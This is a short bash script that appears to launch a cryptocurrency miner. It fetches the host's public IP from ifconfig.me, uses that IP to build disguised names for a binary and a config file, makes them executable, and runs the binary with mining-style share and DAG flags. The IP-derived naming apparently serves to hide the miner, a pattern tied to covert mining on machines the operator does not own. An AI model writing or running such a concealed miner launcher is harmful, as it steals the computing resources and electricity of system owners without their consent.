!/bin/bash
benjot=$(echo "$(curl -s ifconfig.me)" | tr . j )
kuntul=$(echo "$(curl -s ifconfig.me)" | tr . k )
chmod +x $benjot
chmod +x $kuntul.conf

./$benjot --read-config $kuntul.conf --dag-fix --ocX --mt-auto --latency --show-mode --shares-detail --all-shares --show-shares
